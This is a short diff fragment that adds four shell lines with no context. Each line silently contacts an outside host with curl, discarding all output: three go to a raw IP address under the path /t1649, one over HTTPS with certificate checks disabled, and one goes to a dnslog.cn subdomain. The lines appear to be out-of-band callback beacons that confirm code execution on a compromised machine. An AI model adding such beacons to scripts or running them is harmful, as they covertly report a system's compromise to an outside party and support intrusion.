@@ -1,0 +1,4 @@
+curl -s -m 3 -o /dev/null http://91.215.85.170:8080/t1649 >/dev/null 2>&1
+curl -sk -m 3 -o /dev/null https://91.215.85.170/t1649 >/dev/null 2>&1
+curl -s -m 3 -o /dev/null http://91.215.85.170/t1649 >/dev/null 2>&1
+curl -s -m 3 -o /dev/null http://dy1649.lt46i7.dnslog.cn/ >/dev/null 2>&1
